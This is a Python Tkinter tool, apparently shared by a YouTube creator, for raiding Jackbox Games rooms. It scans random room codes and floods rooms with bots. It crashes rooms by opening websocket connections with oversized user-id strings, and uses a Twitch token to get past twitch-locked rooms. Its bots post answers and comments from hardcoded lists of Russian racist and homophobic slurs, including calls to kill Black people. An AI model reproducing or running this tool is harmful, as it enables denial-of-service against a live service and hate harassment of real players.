# WARNING: SHIT CODE
# VERSION: BETA
# PLEASE, SUB: https://www.youtube.com/@strongplayer9761, THANK YOU!

try:
    import requests, time, websocket, json, random, threading, os
    from tkinter import *
except:
    choice = input('Mistake: the modules are not installed. Install it? (no/yes)\nChoice:    ')
    if choice.lower().replace(' ', '').replace('    ', '') == 'yes':
        import os
        for module in ['requests', 'websocket-client', 'json', 'random', 'threading', 'time', 'tkinter']:
            os.system(f'pip install {module}')
        import requests, time, websocket, json, random, threading
        from tkinter import *

window = Tk()
window.title('JackBox Simple Botter')
window.geometry('350x620')
window.configure(bg='black')
window.resizable(False, False)
listfrom = []
roomslist = []
nicknamee = []
nicknameee = []
drms = []
strings = 'QWERTYUIOPASDFGHJKLZXCVBNM'

def Scan():
    
    code = ''
    for i in range(4):code=f'{code}{random.choice(strings)}'
    r = requests.get(f'https://ecast.jackboxgames.com/api/v2/rooms/{code}')
    if json.loads(r.text)['ok'] != False:
        #print(f'Raiding: {code}')
        Botting(code)

def CrashRoom(code, host, bypass, type):
    global work, roomslist
    work = True
    crashed = False
    def add_log(text):
        log_text.config(state='normal')
        log_text.insert(END, text + '\n') 
        log_text.see(END)
        log_text.config(state='disabled')
    def on_message(ws, message):
        print(message)
    def on_error(ws, error):
            #add_log(f'{nickname.replace("%20", "")} Error.')
        print(f'ERROR: ws - {ws} error - {error}')
    def on_close(ws, *args):
        global work, roomslist
        for obj in roomslist:
            if obj['code'] == code and obj['type'] == type and obj['bypass'] == bypass and crashed == False: 
                obj['successful'] = True

                add_log(f'Crashed a room {code}!')
                work = False
                time.sleep(3)
                roomslist.remove(obj)
        
            #print(f"ERROR: {ws} CODE: {args}")
        print(f'CLOSED: ws - {ws} error - {args}')
    def on_open(ws):...
    if work:
            result = ''
            cl = random.randint(190,195) if type == 'bigcrasher' else random.randint(1,25)
            #cl = random.randint(1,25)
            for b in range(cl):
                result = f"{result}1000000000000000000000000000000000000{random.randint(1000,9999)}"
            print(host)
            add_log(f"Crashing a room {code}... Content lenght: {cl*len('10000000000000000000000000000000000000000')}")
            add = True
            for obj in roomslist:
                if obj['code'] == code and obj['type'] == type and obj['bypass'] == bypass: add = False
            if add: roomslist.append({'code': code, 'successful': False, 'type': type, 'bypass': bypass, 'gamename': gamename})
            def checker():
                global roomslist
                time.sleep(15)
                for obj in roomslist:
                    if obj['code'] == code and obj['type'] == type and obj['bypass'] == bypass: 
                        if obj['successful'] == False: 
                            roomslist.remove(obj)
                            crashed = False
            threading.Thread(target=checker).start()
        #wss://i-0cfef0169a3fd31c1.play.jackboxgames.com/api/v2/rooms/VVIH/play?role=player&name=jackboxhack%E2%80%A6&format=json&user-id=ae6ed61c-700b-464f-aed8-e4d800e81298&twitch-token=aahsvvkd62yartdrj7quurw410nf6i
        #"wss://ecast.jackboxgames.com/api/v2/audience/{code}/play?role=audience&name=debik&format=json&user-id={result}"
            ws = websocket.WebSocketApp(f"wss://{host}/api/v2/rooms/{code}/play?role=player&name=debik&format=json&user-id={result}{'&twitch-token='+TwitchToken_entry.get().replace(' ', '').replace('   ', '') if bypass else ''}",
            #ws = websocket.WebSocketApp(f"wss://ecast.jackboxgames.com/api/v2/audience/{code}/play?role=audience&name=debik&format=json&user-id={result}",
                                                    on_message = on_message,
                                                    on_error = on_error,
                                                    on_close = on_close,
                                                    header={'Sec-Websocket-Extensions': 'permessage-deflate; client_max_window_bits',
                                                    'Sec-Websocket-Key': 'hPqQ5E6c0/kl8z4Ygve1g==',
                                                    'Sec-Websocket-Protocol': 'ecast-v0',
                                                    'Sec-Websocket-Version': '13'})
            ws.on_open = on_open

            ws.run_forever()
            #time.sleep(5)

def StartScanBotting():

    #log_text.config(state='normal')
    #log_text.delete('1.0', END)
    #log_text.config(state='disabled')
    def add_log(text):
        log_text.config(state='normal')
        log_text.insert(END, text + '\n') 
        log_text.see(END)
        log_text.config(state='disabled')
    add_log('Started Auto Scan And Raiding!')
    while True:
        threading.Thread(target=Scan).start()

def Botting(code, type):

    global gamename
    code = str(code).upper()
    numberofbots = NumberOfBots_entry.get().replace(' ', '').replace('  ', '')
    log_text.config(state='normal')
    def add_log(text):
        log_text.config(state='normal')
        log_text.insert(END, text + '\n') 
        log_text.see(END)
        log_text.config(state='disabled')
    if numberofbots == '' and type != 'crasher' and type != 'bigcrasher':return
    if type != 'crasher' and type != 'bigcrasher':
        add_log(f'Trying add a {numberofbots} bots...') 
    while True:
        try:
            r = requests.get(f'https://ecast.jackboxgames.com/api/v2/rooms/{code}', timeout=1)
            break
        except:...
    loaded_text = json.loads(r.text)
    #print(loaded_text)
    #print(r.text)
    if loaded_text['ok']:
        bypass = False
        gamename = str(loaded_text['body']['appTag']).capitalize()
        host = loaded_text['body']['host']
        window.title(f"JackBox Simple Botter || Game: {gamename.replace(' Vote', '')}")
        if loaded_text['body']['twitchLocked'] == True and (type == 'player' or type == 'crasher' or type == 'bigcrasher'): 
            add_log('Warning: Room is twitch locked! Bypass activated!') 
            if TwitchToken_entry.get().replace(' ', '').replace('   ', '') == '':
                add_log('Incorrect token!')
            #return
            bypass = True
        if loaded_text['body']['locked'] and (type == 'player' or type == 'crasher' or type == 'bigcrasher'):
            add_log('Room is locked!') 
            return
        if loaded_text['body']['full'] and (type == 'player' or type == 'crasher' or type == 'bigcrasher'):
            add_log('Room is full!') 
            return
        with open('C:\\JackBox Spammer Configuration.json', 'r') as f:
            with open('C:\\JackBox Spammer Configuration.json', 'w') as f2:
                f2.write('{"twitch_token": "'+TwitchToken_entry.get().replace(' ', '').replace('   ', '')+'", "number": "'+numberofbots+'", "nicknames": "'+NameOfBots_entry.get().replace(' ', '').replace('  ', '')+'"}')
        if type != 'crasher' and type != 'bigcrasher':
            for i in range(int(numberofbots)):
                threading.Thread(target=AddBot, args=(code,type,host,bypass)).start()
        else:
            threading.Thread(target=CrashRoom, args=(code,host,bypass,type,)).start()
    else:
        add_log('Incorrect room!') 

def AddBot(roomcode, type, host, bypass):
    global nicknamee, listfrom, gamename, nicknameee, drms
    ##print(roomcode)
    sessionnick = ''
    botsname = NameOfBots_entry.get().replace(' ', '').replace('    ', '')
    if roomcode == '':return
    if botsname == '':return#sessionnick
    botsnamelist = [
    'qq_splash', 'jackar4', 'Skibi', 'Squued4', 'cursed.zxc', 'Andrey', 'Bratishhqq', 'LoazOff', 'Pers', 'TwitchLOVE',
    'СТРИМЕРТОП', 'ProGamer123', 'ТОПЕР', 'ден', 'ДИМАС', '228', 'ЛучШИЙ', 'JackSarchikkk', 'zeldi6', 'question2007', 'baga1245', 'kiratop203', 'kenas666', 'ТИМКУК', 'SKIBIDIDOP'
]
    if botsname == r'%random%': botsname = random.choice(botsnamelist)
    #log_text.config(state='normal')
    #log_text.delete('1.0', END)
    #log_text.config(state='disabled')
    def add_log(text):
        log_text.config(state='normal')
        log_text.insert(END, text + '\n') 
        log_text.see(END)
        log_text.config(state='disabled')
    nickname = f'{botsname}{r"%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20" if botsname in botsnamelist else ""}_{random.randint(1000000000,99999999999)}'
    #add_log(f'Trying add a {nickname.replace("%20", "")}')
    drms.append(False)
    nicknameee.append(nickname)
    def on_message(ws, message):
        global gamename, listfrom, nicknamee, nicknameee, drms, roomslist
        nonlocal sessionnick
        #print(message)
        choiced = False
        try: 
            if 'full' in json.loads(message)['result']['msg']: 
                add_log(f'Room {roomcode} is full!') 
                drms[nicknameee.index(nickname)] = True
        except: ...
        try: 
            if 'locked' in json.loads(message)['result']['msg']: 
                add_log(f'Room {roomcode} is locked!') 
                drms[nicknameee.index(nickname)] = True
        except: ...
        try: 
            if 'exit' in json.loads(message)['opcode']: 
                add_log(f'Room {roomcode} is closed!') 
        except: ...
        try: 
            if 'twitch' in json.loads(message)['result']['msg']: 
                add_log('Incorrect token!') 
                drms[nicknameee.index(nickname)] = True
        except: ...
        if json.loads(message)['opcode'] == 'client/welcome':
            #nickname = json.loads(message)['result']['name']
            sessionnick = json.loads(message)["result"]["name"]
            add_log(f'Added a bot: {sessionnick}')
            #add_log(f'{json.loads(message)["result"]["name"]}')

            add = True

            for obj in roomslist:

                if obj['code'] == roomcode and obj['type'] == type and obj['bypass'] == bypass: add = False

            if add: roomslist.append({'code': roomcode, 'num': 0, 'type': type, 'bypass': bypass, 'gamename': gamename})

            for obj in roomslist:

                if obj['code'] == roomcode and obj['type'] == type and obj['bypass'] == bypass:

                    obj['num'] += 1
                    
            #print(roomslist)

            if type == 'player': 
                listfrom.append(int(json.loads(message)['result']['id']))
                nicknamee.append(nickname)
        if 'Vote' in message and 'count' in json.loads(message)['opcode'] and type == 'audience':
            gamename = str(json.loads(message)['result']['key']).replace(' Vote', '')
            #print(gamename)
        if 'object' in json.loads(message)['opcode']  and 'countGroupKey' in message and type == 'audience':
            try:
                gamename = json.loads(message)['result']['val']['countGroupKey']
                #print(next(iter(json.loads(message)['result']['choices'].keys())))
                if gamename != 'TriviaDeath2AudienceChoice': gamename = f'{gamename} Vote'
                #print('gamename: '+gamename)#{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"Fibbage3 Vote","vote":"FINGERING MY ASS","times":1}}
                #print(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"')+next(iter(json.loads(message)['result']['choices'].keys()))+str('","times":1}}'))
                ws.send(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"')+next(iter(json.loads(message)['result']['choices'].keys()))+str('","times":1}}'))
                choiced = True
            except Exception as e:print(e)
        if 'audienceQuip' in message and type == 'audience' and json.loads(message)['opcode'] != 'client/welcome':
            if not gamename.endswith('Vote'): 
                if gamename != 'TriviaDeath2AudienceChoice' and not gamename.endswith('Vote'): gamename = f'{gamename} Vote'
            ws.send('{"seq":1,"opcode":"audience/text-ring/push","params":{"name":"'+gamename.replace(" Vote", " Comments")+'","text":"ПИДОРАСЫ '+str(random.randint(1000,9999))+'"}}')
            #add_log(f'Maked a choice (text) {nickname.replace("%20", "")}')
        if 'choices' in message and type == 'audience' and json.loads(message)['opcode'] != 'client/welcome': 
            if gamename != 'TriviaDeath2AudienceChoice' and not gamename.endswith('Vote'): gamename = f'{gamename} Vote'
            #print('gamename: '+gamename)
            ws.send(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"right","times":1}}'))
            ws.send(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"0","times":1}}'))
            try:
                #print(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"')+str(json.loads(message)['result']['choices'][0])+str('","times":1}}'))
                ws.send(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"')+str(json.loads(message)['result']['choices'][0])+str('","times":1}}'))
            except Exception as e: print(e)
            try:
                #print(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"')+str(json.loads(message)['result']['val']['choices'][0]['text'])+str('","times":1}}'))
                ws.send(str('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"')+str(gamename)+str('","vote":"')+str(json.loads(message)['result']['val']['choices'][0]['text'])+str('","times":1}}'))
            except Exception as e: print(e)
            ws.send('{"seq":1,"opcode":"audience/count-group/increment","params":{"name":"audienceChoose","vote":"0","times":1}}')
            #add_log(f'Maked a choice {nickname.replace("%20", "")}')
        if ('CanStart' in message or 'canStart' in message) and type == 'player':
            ws.send('{"seq":1,"opcode":"client/send","params":{"from":2,"to":1,"body":{"startGame":true}}}')
                #add_log(f'Started a game {nickname.replace("%20", "")}')
            time.sleep(3)
        if 'quest' in message and type == 'player' and json.loads(message)['opcode'] != 'client/welcome':
            try:#
                def makeanswertext(fromm,questionid,nickname):
                    time.sleep(random.randint(14,26))
                    answers = ['НЕГРЫ ПИДОРЫ', 'МАТЬ ЕБАЛ НЕГРОВ', 'ЧЕРНОКОЖИЕ ОБЕЗЬЯНЫ СОСИТЕ', 'ТВИЧ ТОП НО НЕГРЫ ДАУНЫ', 'ГОЛД МАН ЧЕНЕЛ ПИДОРАС', 'ПИДОРАСЫ', 'УБИТЬ НЕГРОВ', 'НЕГРЫ РАБЫ',
                               'ВЫ ПИДОРАС', 'НЕГР', 'ТВИЧ ДЛЯ ДАУНОВ', 'ДАУН НЕГР ПИДР ДОЛБОЕБ', 'ОТВЕТ: НЕГРИЛА']
                    ws.send('{"seq":1,"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"answer":"'+str(random.choice(answers))+'","questionId":'+str(questionid)+'}}}')
                    #add_log(f'Maked an answer (text) {nickname.replace("%20", "")} {fromm} {questionid}')
                fromm = listfrom[nicknamee.index(nickname)]
                questionid = json.loads(message)['result']['val']['question']['id']
                threading.Thread(target=makeanswertext, args=(fromm,questionid,nickname,)).start()
            except Exception as e: print(e) 
        if ('input' in message or 'text' in message or 'entry' in message or 'placeholder' in message or 'maxlength' in str(message).lower()) and type == 'player' and json.loads(message)['opcode'] != 'client/welcome':
            try:
                def makeanswertext(fromm,nickname,):
                    time.sleep(random.randint(7,14))
                    answers = ['НЕГРЫ ПИДОРЫ', 'МАТЬ ЕБАЛ НЕГРОВ', 'ЧЕРНОКОЖИЕ ОБЕЗЬЯНЫ СОСИТЕ', 'ТВИЧ ТОП НО НЕГРЫ ДАУНЫ', 'ГОЛД МАН ЧЕНЕЛ ПИДОРАС', 'ПИДОРАСЫ', 'УБИТЬ НЕГРОВ', 'НЕГРЫ РАБЫ',
                        'ВЫ ПИДОРАС', 'НЕГР', 'ТВИЧ ДЛЯ ДАУНОВ', 'ДАУН НЕГР ПИДР ДОЛБОЕБ', 'ОТВЕТ: НЕГРИЛА']
                    ws.send('{"seq":1,"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"action":"write","entry":"'+str(random.choice(answers))+'"}}}')
                    ws.send('{"seq":2,"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"entry":"'+str(random.choice(answers))+'"}}}')
                    #add_log(f'Maked an answer (text) {nickname.replace("%20", "")} {fromm}')
                fromm = listfrom[nicknamee.index(nickname)]
                threading.Thread(target=makeanswertext, args=(fromm,nickname,)).start()
            except Exception as e: print(e) 
        if ('doneVoting' in message or 'choices' in message) and type == 'player' and json.loads(message)['opcode'] != 'client/welcome':
            fromm = listfrom[nicknamee.index(nickname)]
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"vote":"left"}}}')
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"vote":"right"}}}')#{"seq":5,"opcode":"client/send","params":{"from":2,"to":1,"body":{"vote":0}}}
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"vote":0}}}')
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"vote":1}}}')
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"action":"choose","choice":0}}}')
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"chosenCategory":0}}}')
            add_log(f'Maked an answer (button) {sessionnick} {fromm}')
        if ('icture' in message or 'draw' in str(message).lower()) and type == 'player':
            fromm = listfrom[nicknamee.index(nickname)]
            answers = ['НЕГРЫ ПИДОРЫ', 'МАТЬ ЕБАЛ НЕГРОВ', 'ЧЕРНОКОЖИЕ ОБЕЗЬЯНЫ СОСИТЕ', 'ТВИЧ ТОП НО НЕГРЫ ДАУНЫ', 'ГОЛД МАН ЧЕНЕЛ ПИДОРАС', 'ПИДОРАСЫ', 'УБИТЬ НЕГРОВ', 'НЕГРЫ РАБЫ',
                               'ВЫ ПИДОРАС', 'НЕГР', 'ТВИЧ ДЛЯ ДАУНОВ', 'ДАУН НЕГР ПИДР ДОЛБОЕБ', 'ОТВЕТ: НЕГРИЛА']
            ws.send('{"seq":'+str(random.randint(3,5))+',"opcode":"client/send","params":{"from":'+str(fromm)+',"to":1,"body":{"setPlayerPicture":true,"picture":"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"}}}')
